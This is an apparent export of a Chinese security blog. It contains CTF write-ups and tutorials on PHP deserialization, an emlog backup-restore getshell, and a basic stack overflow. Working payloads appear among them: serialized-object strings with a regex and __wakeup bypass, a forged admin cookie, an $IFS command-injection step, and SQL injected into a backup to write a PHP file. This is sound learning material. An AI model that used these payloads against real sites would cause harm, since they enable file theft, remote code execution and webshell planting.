常见的正则引擎有DFA和NFA，分别叫做确定性有限状态自动机和非确定性有限状态自动机 其中NFA的执行过程存在回溯，PHP就使用了NFA引擎，其中PCRE库属于NFA引擎]]></content>
      <tags>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2018安恒12月赛复现]]></title>
    <url>%2F2019%2F01%2F13%2F2018%E5%AE%89%E6%81%9212%E6%9C%88%E8%B5%9B%E5%A4%8D%E7%8E%B0%2F</url>
    <content type="text"><![CDATA[WEBeasy题目是如下代码 &lt;?php @error_reporting(1); include &apos;flag.php&apos;; class baby { public $file; function __toString() { if(isset($this-&gt;file)) { $filename = &quot;./{$this-&gt;file}&quot;; if (file_get_contents($filename)) { return file_get_contents($filename); } } } } if (isset($_GET[&apos;data&apos;])) { $data = $_GET[&apos;data&apos;]; preg_match(&apos;/[oc]:\d+:/i&apos;,$data,$matches); if(count($matches)) { die(&apos;Hacker!&apos;); } else { $good = unserialize($data); echo $good; } } else { highlight_file(&quot;./index.php&quot;); } ?&gt; 很显然是一个反序列化漏洞 将参数改为flag.php即可读取到flag文件 生成poc的代码如下 &lt;?php @error_reporting(1); class baby { public $file = &quot;flag.php&quot;; function __toString() { if(isset($this-&gt;file)) { $filename = &quot;./{$this-&gt;file}&quot;; if (file_get_contents($filename)) { return file_get_contents($filename); } } } } $a = new baby(); echo serialize($a); ?&gt; 本地访问页面生成的反序列化字符串为： O:4:&quot;baby&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;} 将该串内容作为data的值传入，发现被waf拦截 仔细查看题目正则部分，用+4绕过即可 ezweb2使用御剑扫描目录发现了admin.php文件，访问后提示： 提示不是admin，下意识的查看cookie 将user部分base64解码得到user,我们将admin base64编码后将其替换 进入到后台 发现可以命令执行，但是过滤了空格 空格可以使用$IFS绕过 ls$IFS/ 读取flag文件 MISC学习资料拿到文件后很明显是明文攻击 跑出密码 打开解压后的Word文档，将图片移走，得到flag JUJU题目提示有11只猪，而打开图片明显数量不足，尝试修改图片高度 发现了base32编码 解密后得到flag]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PHP反序列化总结]]></title>
    <url>%2F2019%2F01%2F12%2FPHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[漏洞成因Demo： &lt;?php class A{ public $target = &quot;demo&quot;; function __destruct(){ echo &quot;destructing!&lt;br/&gt;&quot;; echo $this-&gt;target.&quot;&lt;br/&gt;&quot;; echo &quot;destructed!&lt;br/&gt;&quot;; } } $a = $_GET[&apos;test&apos;]; $a_unser = unserialize($a); ?&gt; 在这里我们可以构造一个对象，控制$test的值，以实现控制数据流的目的 生成序列化字符串： &lt;?php class A{ public $target = &quot;w2t3rp2dd13r&quot;; } $a = serialize(new A); echo $a; ?&gt; 常见绕过方式_wakeup绕过： wakeup()是用在反序列化操作中。unserialize()会检查存在一个wakeup()方法。如果存在，则先会调用__wakeup()方法。 &lt;?php class A{ function __wakeup(){ echo &apos;Hello&apos;; } } $c = new A(); $d=unserialize(&apos;O:1:&quot;A&quot;:0:{}&apos;); ?&gt; 存在wakeup函数，所以会输入hello &lt;?php class Student{ public $full_name = &apos;zhangsan&apos;; public $score = 150; public $grades = array(); function __wakeup() { echo &quot;__wakeup is invoked&quot;; } } $s = new Student(); var_dump(serialize($s)); ?&gt; 这里会输出student的实例序列化字符串 O:7:&quot;Student&quot;:3:{s:9:&quot;full_name&quot;;s:8:&quot;zhangsan&quot;;s:5:&quot;score&quot;;i:150;s:6:&quot;grades&quot;;a:0:{}} student后的3代表该类存在3个属性 而当该属性大于真实值时代码就会跳过_wakeup()函数执行 所以当输入序列化字符串为： O:7:”Student”:4:{s:9:”full_name”;s:8:”zhangsan”;s:5:”score”;i:150;s:6:”grades”;a:0:{}} 时，就不会执行_wakeup()函数。]]></content>
      <tags>
        <tag>反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[emlog后台数据备份getshell]]></title>
    <url>%2F2019%2F01%2F11%2Femlog%E5%90%8E%E5%8F%B0%E6%95%B0%E6%8D%AE%E5%A4%87%E4%BB%BDgetshell%2F</url>
    <content type="text"><![CDATA[此漏洞适用版本&lt;= 5.1.2 漏洞原理是通过在恢复数据库备份时插入恶意代码，以达到getshell的目的 首先登陆到博客后台，进入数据备份和恢复功能 点击开始备份，我们会在本地生成一个数据库文件 要getshell，我们可以在得到的数据库文件中插入生成恶意文件的代码，但是我们需要知道该站点在服务器中的绝对路径 经过审计发现在admin/index.php中存在如下代码 这样我们只需访问127.0.0.1/admin/index.php?action=phpinfo就可以触发phpinfo()函数进而得到绝对路径了 有了绝对路径我们就可以在数据库备份文件中插入如下代码 这里调用了mysql语句，在目录下生成yml.php的文件 把代码插入到数据备份中 再次进入emlog后台，利用数据恢复功能，将修改过的备份文件导入 我们看下admin录下是否存在yml.php文件 可以看到成功在admin目录下生成了可执行PHP文件，在实战中可将该文件变成一句话木马，进行下一步的操作]]></content>
      <tags>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pwn简单栈溢出]]></title>
    <url>%2F2018%2F11%2F30%2Fpwn%E7%AE%80%E5%8D%95%E6%A0%88%E6%BA%A2%E5%87%BA%2F</url>
    <content type="text"><![CDATA[作为队伍里稍微会一点逆向的小白，开坑pwn也确实遇到了许多问题，暴露出很多基础知识的欠缺，直至编写本文时，编者从未在任何比赛中触碰过pwn，更多的时候是对pwn深深的“恐惧”，这也是许多人的通病，也导致精通pwn的人都被业界称为“pwn爷爷”甚至“pwn祖宗”，可见pwn在ctf领域中是一座冰山，很少有人触及，小编由于在最近的几场比赛中深深被pwn拖了后腿，因此决定在闲暇之余会一会这座“冰山”,以后的几期中，小编将记录下自己学习的历程，希望能在二进制这方面有所收获，也希望正在阅读本文的你能绕过小编踩过的坑。 今天记录一下开坑的第一个程序，虽然程序很简单，但是收获了不少东西 首先我们拿到一个名为icecream的Linux下可执行ELF文件，用file命令查看文件属性 可以看到这是一个32位程序 接着我们检查一下程序开启了哪些保护措施 接下来我们来运行程序 程序很简单，给了我们一个输入点 ，这其实是一个最简单的溢出问题，如果有接触过c语言的小伙伴们在编写程序时，当一个输入点超出了接收函数的处理范围，就会造成诸如卡死、闪退、乱码的情况。而本例的思路也很常规，即通过可控输入点，令输入字符串长度足以覆写掉函数返回地址（EIP），使得函数执行完毕后自动跳转到我们需要其跳转到的地址，这样我们就可以执行我们的shellcode,pwn掉程序。 下面我们来判断一下输入点距离EIP需要填充多少个字符串 运行程序 运行到输入点，输入刚刚生成的字符串 提示了无效的返回地址 这样我们就得到了返回地址，下面计算一下输入点到EIP的偏移量 我们需要将shellcode保存到bss段中，bss段的地址可以在ida中查看 可以看到执行shellcode成功]]></content>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
</search>
